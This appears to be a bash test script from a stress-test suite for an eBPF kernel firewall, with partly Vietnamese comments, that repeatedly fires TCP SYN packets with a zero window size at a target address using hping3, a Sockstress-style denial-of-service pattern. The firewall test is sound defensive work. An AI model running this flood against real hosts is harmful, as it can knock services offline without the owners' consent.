#!/usr/bin/env bash
# ==============================================================================
# Aegis-Stress: Test 08 - TCP Zero-Window & Sockstress Anomaly
# Target eBPF Kernel Defense:
#   - [Method 13] TCP Zero-Window / Anomaly Dropped (STAT_DROPPED_TCP_ANOMALY)
#   - Blocks attacks attempting to lock server TCP receive buffers (window size = 0)
# Chạy liên tục không giới hạn thời gian (Nhấn Ctrl+C để dừng)
# ==============================================================================
set -euo pipefail

TARGET_IP="${1:-172.30.0.101}"
TARGET_PORT="${2:-80}"

cleanup() {
    echo -e "\n[✓] Đã dừng Test 08 (TCP Zero-Window)."
    kill 0 2>/dev/null || true
    exit 0
}
trap cleanup INT TERM

echo "======================================================================"
echo "[*] TEST 08: TCP Zero-Window Attack (Window size = 0)"
echo "[*] Target: ${TARGET_IP}:${TARGET_PORT}"
echo "[*] Chế độ: TỰ ĐỘNG LIÊN TỤC (Nhấn Ctrl+C để dừng bất kỳ lúc nào)"
echo "[!] Expected Kernel Firewall Reaction:"
echo "    -> Method 13: Drop packets advertising 0 window size intended to freeze sockets"
echo "    -> Counter to monitor on Kernel: STAT_DROPPED_TCP_ANOMALY"
echo "======================================================================"

if ! command -v hping3 &>/dev/null; then
    echo "[!] Error: hping3 is not installed."
    exit 1
fi

echo "[>] Đang phát liên tục TCP SYN kèm thông số Window Size = 0 (Sockstress)..."
while true; do
    hping3 -c 30 -i u2000 -S -p "$TARGET_PORT" --win 0 "$TARGET_IP" 2>/dev/null || true
done
